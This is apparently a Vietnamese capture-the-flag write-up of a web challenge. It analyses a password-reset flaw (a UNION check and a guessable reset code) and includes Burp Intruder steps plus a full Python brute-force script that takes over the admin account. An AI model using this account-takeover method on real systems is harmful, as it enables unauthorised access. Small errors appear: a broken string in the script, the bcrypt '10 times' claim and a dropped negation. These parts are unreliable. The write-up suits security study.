# 2. Giải thích luồng hoạt động 

Trước tiên mình sẽ giải thích sơ qua về code và luồng hoạt động của chúng 

File `auth.js` chịu trách nhiệm **Đăng ký** , **Đăng nhập** , và **Đăng xuất**.

***Chức năng Đăng ký***

```python
router.post('/register', async (req, res) => {
    const { username, password, email } = req.body;
```
`router.post('/register', ...)` : Định nghĩa đường dẫn đăng ký . Dùng phương thức POST 

`const { ... } = req.body` : Lấy thông tin người dùng gửi lên từ form đăng ký ( gồm tên , mật khẩu , email ).

```python
try {
        const hashedPassword = await bcrypt.hash(password, 10);
``` 
`bcrypt.hash(password, 10)` : Đây là bước quan trọng nhất 

- Nó lấy mật khẩu người dùng nhập 
- Nó băm nát mật khẩu đó ra 10 lần 
- Kết quả `hashedPassword` sẽ là một chuỗi vô nghĩa . Điều này giúp bảo mật , kể cả Admin hay Hacker vào được Database cũng biết mật khẩu thật

```python
db.query(
            'INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
            [username, hashedPassword, email, 'user'],
            (error, results) => {
```
`db.query(...)`: Gửi lệnh vào Database MySQL.

`INSERT INTO users ...` : Lệnh thêm người dùng mới vào bảng `users`

`VALUES (?, ?, ?, ?)` : Các dấu `?` sẽ được thay thế bằng dữ liệu thật ở dòng dưới. Việc này giúp chống lại lỗi SQL Injection cơ bản 

`'user'` : Mặc định ai đăng ký cũng chỉ là user thường, không được làm `admin`.

***Chức năng đăng nhập***

```python
router.post('/login', (req, res) => {
    const { username, password } = req.body;
```
Nhập tên và mật khẩu người dùng gửi lên để đăng nhập

```python
db.query(
        'SELECT * FROM users WHERE username = ?',
        [username],
        async (error, results) => {
```
`SELECT * FROM users ...` : Tìm trong db xem có ai tên giống `username` người dùng nhập không

```python
const user = results[0];
            const match = await bcrypt.compare(password, user.password);

            if (!match) {
                return res.status(401).json({ error: 'Invalid credentials' });
            }
```
`bcrypt.compare(...)`: So sánh mật khẩu.

```python
req.session.user = {
                id: user.id,
                username: user.username,
                email: user.email,
                role: user.role
            };

            res.json({ success: true, message: 'Login successful!', role: user.role });
```

`req.session.user = ...` : Server lưu thông tin của người này vào bộ nhớ phiên làm việc (Session). Từ giờ trở đi, mỗi khi gửi request, Server sẽ kiểm tra req.session để biết là ai, có phải Admin không.

File `resetPassword.js` : File này nhận yêu cầu từ người dùng (HTTP Request).

```python
router.post('/resetpassword', (req, res) => {
    const { username, email, passwordnew, code_reset } = req.body;

    if (!username || !email) {
        return res.status(400).json({ error: 'Username and email are required' });
    }
```
Hàm này xử lý yêu cầu gửi đến đường dẫn `/resetpassword`.

Nó lấy 4 thông tin từ người dùng: **Tên**, **Email**, **Mật khẩu mới**, và **Mã reset** (nếu có).

**Lỗ hổng logic đầu tiên : Kiểm tra tài khoản** 

```python
const validateQuery = 'SELECT 1 FROM users WHERE username = ? UNION SELECT 2 FROM users WHERE email = ?';
    
    db.query(validateQuery, [username, email], (error, results) => {
        // ... (xử lý lỗi database) ...

        if (results.length !== 2) {
            return res.status(400).json({ error: 'Invalid username or email' });
        }
```
`UNION` : CÂU LỆNH SQL GHÉP KẾT QUẢ 

 - Vế 1: Tìm xem `username` có tồn tại không?
 - Vế 2: Tìm xem `email` có tồn tại không?

Nó không kiểm tra mối liên hệ. Bạn có thể nhập username của Admin nhưng email của Hacker. Cả 2 đều tồn tại trong hệ thống (ở 2 tài khoản khác nhau), nên kết quả vẫn là 2 dòng -> Hệ thống bị lừa và cho qua!

```python
if (!code_reset || code_reset === '') {
            let newResetCode;
            // KIỂM TRA EMAIL ĐỂ CHỌN ĐỘ KHÓ CỦA MÃ
            if (email.toLowerCase().includes('admin')) {
                newResetCode = uuidv4(); // Mã khó (nếu email chứa chữ 'admin')
            } else {
                // LỖ HỔNG SỐ 2: TẠO MÃ YẾU
                const randomLetter = String.fromCharCode(65 + Math.floor(Math.random() * 6));
                const randomNumbers = Math.floor(10 + Math.random() * 90);
                newResetCode = randomLetter + randomNumbers + randomLetter;
            }            
            
            // Lưu mã vào Database
            updateCodeReset(username, email, newResetCode, (error, resetCode) => {
                // ... Trả về thông báo thành công ...
            });
```
Đoạn code này sẽ tạo mã reset , lúc này `code_reset` để trống 

Vì bạn nhập email là `test1@gmail.com` (không chứa chữ "admin"), code nhảy vào nhánh else.

Công thức tạo mã yếu:
 - `randomLetter`: Chọn 1 chữ cái từ A-F (65 + random*6).
 - `randomNumbers`: Chọn số từ 10-99.

`updateCodeReset`: Lưu cái mã yếu xìu này vào Database, gắn với username là admin (do lỗ hổng số 1 ở trên đã cho qua user admin).

---
# 3. Phân tích và khai thác

Ban đầu, khi nhìn vào source code, đặc biệt là file auth.js, mình thấy quy trình đăng nhập rất chặt chẽ:

- Mật khẩu được mã hóa bằng bcrypt (một thuật toán băm rất mạnh, không thể dịch ngược).
 - Câu lệnh SQL sử dụng `?` nên không thể sử dụng kỹ thuật **SQL Injection** cơ bản (như `' OR 1=1 --`) để vượt qua bước đăng nhập.

**Kết luận**: Tấn công trực tiếp vào trang Login là bất khả thi. Cần chuyển hướng sang các tính năng khác.

***Phát hiện Lỗ hổng Logic***

Khi đọc **file** `resetPassword.js`, ta phát hiện ra 2 vấn đề nghiêm trọng nằm cạnh nhau:

- Hệ thống sử dụng câu lệnh UNION để kiểm tra thông tin trước khi reset mật khẩu:
  
  - UNION là lệnh SQL dùng để gộp kết quả của 2 câu lệnh SELECT lại với nhau.
  - Code chỉ đếm số dòng trả về (length === 2). Nó kiểm tra xem "User có tồn tại không?" VÀ "Email có tồn tại không?" một cách tách biệt. Nó QUÊN kiểm tra xem Email đó có thực sự thuộc về User đó hay không.
- Sinh mã xác thực yếu

  - Ngay sau khi vượt qua bước kiểm tra trên, code có đoạn tạo mã xác thực (OTP)
  - Vấn đề: Nếu email nhập vào KHÔNG chứa chữ **"admin"**, hệ thống sẽ tạo ra một mã rất ngắn và dễ đoán, thay vì dùng mã chuẩn `uuidv4`.

Đến đây , mình sẽ nói sơ lược quy trình tấn công như sau : 

Để vượt qua câu lệnh `UNION`, ta cần một **email** tồn tại trong hệ thống nhưng không được chứa chữ **admin** (để kích hoạt lỗ hổng sinh mã yếu).

Thực hiện: Truy cập `/register` **đăng ký** tài khoản mới.

 - User: `test10`
 - Email: `test10@gmail.com`

Tiếp theo , đánh lừa hệ thống như sau :
 
 - Truy cập chức năng **Reset Password**
 - Nhập `username` : `admin`
 - Nhập `email` vừa mới tạo : `test10@gmail.com`
 - Ô `Reset Code` : để trống -> để nó còn gửi mã về 
 - Nhập `New Password` : `12345678`

**Kết quả** : 
 
- `SELECT... username='admin'` -> Tìm thấy (1 dòng).
- `SELECT... email='test10@gmail.com'` -> Tìm thấy (1 dòng).
- Tổng = 2 dòng -> Hệ thống cho phép đi tiếp.
- Email `test10@gmail.com` không chứa chữ **"admin"** -> Hệ thống tạo mã yếu và lưu vào Database cho user admin.

Cuối cùng , dò Reset Code bằng burpsuite 😅

Sau khi có passcode gửi đi thì mình nhập một giá trị bất kì : A10A vào ô Reset Code , rồi dùng burpsuite bắt request đó lại 
 
 - Tiếp tục lấy request vừa bắt được `Add to Instruder` 
 - Trong thẻ Positions của Intruder:
  
   - Attack type: Chọn Cluster bomb.
   - Bôi đen cho 3 vị trí riêng biệt , vị trí đầu là chữ A , vị trí thứ 2 là số 10 , vị trí thứ 3 là chữ A , rồi lần lượt ấn nút **add** cho từng vị trí 
   - Chuyển sang thẻ **Payload** 
   - Payload set: 1 -> Type: Simple list -> Nhập thủ công các chữ cái từ A đến F (A, B, C, D, E, F).
   - Payload set: 2 (Vị trí số ở giữa) -> Type: Numbers -> `From: 10` `To: 99` `Step: 1`
   - Payload set: 3 (Vị trí chữ cái cuối) -> Giống hệt cái đầu 
- Và rồi start attack 

Tuy nhiên cách này khá may rủi , bởi vì passcode chỉ có hiệu lực trong vòng 5 phút mà tổng số request có thể sẽ phải gửi là 6 x 90 x 6 = 3240 requests , cho nên nếu hên , chữ cái đầu tiên mà bắt đầu bằng chữ **A** thì may ra đổi được password mới , và mình đã phải thử đi thử lại nhiều lần liên tục sau mỗi 5 phút 🙂 

Cách 2 : Bạn nhờ ***GEMINI*** viết đoạn code Python , là cách chuẩn chỉ nhất

Đây là đoạn code của nó 
```python
import requests
import itertools
import string
import sys

# CẤU HÌNH
URL = "http://14.225.220.66:5018"  # Điền đúng địa chỉ IP:PORT của bài
MY_EMAIL = "test10@gmail.com"       # Email bạn đã đăng ký và dùng để lừa server
TARGET_USER = "admin"
NEW_PASSWORD = "12345678
"

# Session dùng để giữ kết nối (Cookie)
s = requests.Session()

def trigger_reset_code():
    """Bước 1: Gửi yêu cầu để server tạo mã yếu"""
    print(f"[*] Đang gửi yêu cầu reset password cho {TARGET_USER} với email {MY_EMAIL}...")
    url = f"{URL}/resetpassword"
    data = {
        "username": TARGET_USER,
        "email": MY_EMAIL,
        "code_reset": ""  # Để rỗng để tạo mã mới
    }
    
    try:
        r = s.post(url, json=data)
        if "Reset code generated" in r.text:
            print("[+] Thành công! Server đã tạo mã yếu và lưu vào DB.")
            return True
        else:
            print(f"[-] Thất bại: {r.text}")
            return False
    except Exception as e:
        print(f"[-] Lỗi kết nối: {e}")
        return False

def brute_force():
    """Bước 2: Dò mã reset (A10A -> F99F)"""
    print("[*] Bắt đầu Brute-force mã reset...")
    
    # Tạo danh sách ký tự cần dò
    chars = ['A', 'B', 'C', 'D', 'E', 'F']  # Math.random() * 6
    numbers = range(10, 100)                # 10 -> 99
    
    # Tổng số trường hợp: 6 * 90 * 6 = 3240
    total = len(chars) * len(numbers) * len(chars)
    count = 0
    
    url = f"{URL}/resetpassword"
    
    # Vòng lặp dò mã: Chữ đầu -> Số giữa -> Chữ cuối
    for c1 in chars:
        for n in numbers:
            for c2 in chars:
                code = f"{c1}{n}{c2}" # Ví dụ: A10A
                count += 1
                
                # In tiến trình mỗi 500 lần thử cho đỡ rối mắt
                if count % 500 == 0:
                    print(f"    Đang thử: {code} ({count}/{total})")
                
                data = {
                    "username": TARGET_USER,
                    "email": MY_EMAIL,
                    "passwordnew": NEW_PASSWORD,
                    "code_reset": code
                }
                
                try:
                    r = s.post(url, json=data)
                    
                    # Nếu server trả về success (hoặc password reset successful)
                    if "success" in r.text and "true" in r.text:
                        print(f"\n[!!!] BINGO! Tìm thấy mã đúng: {code}")
                        print(f"[+] Mật khẩu admin đã đổi thành: {NEW_PASSWORD}")
                        print("[+] Hãy vào đăng nhập ngay!")
                        return True
                        
                except Exception as e:
                    pass

    print("\n[-] Đã thử hết mã mà không thành công. Có thể mã đã hết hạn.")
    return False

if __name__ == "__main__":
    if trigger_reset_code():
        brute_force()
```

Khi đã hoàn thành , thì nó tự động thoát , nó tự làm cả bước xin mã và nhập mã rồi cho nên sau khi thoát thì mất khẩu admin đã được đổi thành 12345678 

Bây giờ login lại vào `username` : `admin` và `password` : `12345678` và lấy flag thôi 

`flag : KCSC{G0tt4_h4ck_'3m_4ll!}`

---
# 3. Bài học rút ra 

- Đừng chỉ tìm lỗi cú pháp (Syntax Error): thấy code dùng Prepared Statement (?) là bỏ qua, nghĩ rằng không Hack được SQL Injection.
- Đọc kỹ Source Code (Whitebox): Những lỗi logic như UNION hay công thức Math.random * 6 rất khó phát hiện nếu chỉ scan từ bên ngoài (Blackbox), nhưng lại hiện nguyên hình khi chịu khó đọc code.


















